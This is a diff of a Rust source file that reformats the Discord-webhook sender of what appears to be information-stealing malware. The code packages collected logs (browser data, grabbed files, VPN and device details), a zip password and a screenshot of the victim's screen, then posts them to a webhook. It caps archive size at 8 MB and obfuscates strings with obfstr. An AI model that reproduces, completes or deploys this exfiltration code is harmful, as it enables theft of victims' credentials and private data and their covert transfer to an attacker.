@@ -6,27 +6,28 @@ use collector::{Browser, Collector, Device, FileGrabber, Software, Vpn};
 use derive_new::new;
 use indoc::formatdoc;
 use obfstr::obfstr as s;
-use requests::{write_file_field, write_text_field, BodyRequestBuilder, MultipartBuilder, Request, RequestBuilder};
+use requests::{
+    write_file_field, write_text_field, BodyRequestBuilder, MultipartBuilder, Request,
+    RequestBuilder,
+};
 use utils::format_size;
 
 #[derive(Clone, new)]
 pub struct DiscordWebhook {
-    webhook: Arc<str>
+    webhook: Arc<str>,
 }
 
 fn generate_embed<P, C>(log: &LogContent, password: Option<P>, collector: &C) -> String
 where
     P: AsRef<str>,
-    C: Collector
+    C: Collector,
 {
     let link = match log {
-        LogContent::ExternalLink((link, size)) => Some(
-            format!(
-                r#"[Download [{size}]]({link})"#,
-                size = format_size(*size as _)
-            )
-        ),
-        _ => None
+        LogContent::ExternalLink((link, size)) => Some(format!(
+            r#"[Download [{size}]]({link})"#,
+            size = format_size(*size as _)
+        )),
+        _ => None,
     };
 
     let password = password.map(|password| {
@@ -35,9 +36,17 @@ where
     });
 
     let mut parts = vec![];
-    if let Some(l) = link { parts.push(l); }
-    if let Some(p) = password { parts.push(p); }
-    let description = if parts.is_empty() { "".to_string() } else { parts.join("\\n") };
+    if let Some(l) = link {
+        parts.push(l);
+    }
+    if let Some(p) = password {
+        parts.push(p);
+    }
+    let description = if parts.is_empty() {
+        "".to_string()
+    } else {
+        parts.join("\\n")
+    };
 
     formatdoc! {
         r#"
@@ -118,15 +127,21 @@ impl DiscordWebhook {
 }
 
 impl LogSender for DiscordWebhook {
-    fn send<P, C>(&self, log_file: LogFile, password: Option<P>, collector: &C) -> Result<(), SendError>
+    fn send<P, C>(
+        &self,
+        log_file: LogFile,
+        password: Option<P>,
+        collector: &C,
+    ) -> Result<(), SendError>
     where
         P: AsRef<str> + Clone,
-        C: Collector
+        C: Collector,
     {
         if let LogContent::ZipArchive(archive) = &log_file.content
-            && archive.len() >= 8 * 1024 * 1024 // 8 MB
+            && archive.len() >= 8 * 1024 * 1024
+        // 8 MB
         {
-            return Err(SendError::LogFileTooBig)
+            return Err(SendError::LogFileTooBig);
         }
 
         if let Some(screenshot) = collector.get_device().get_screenshot() {
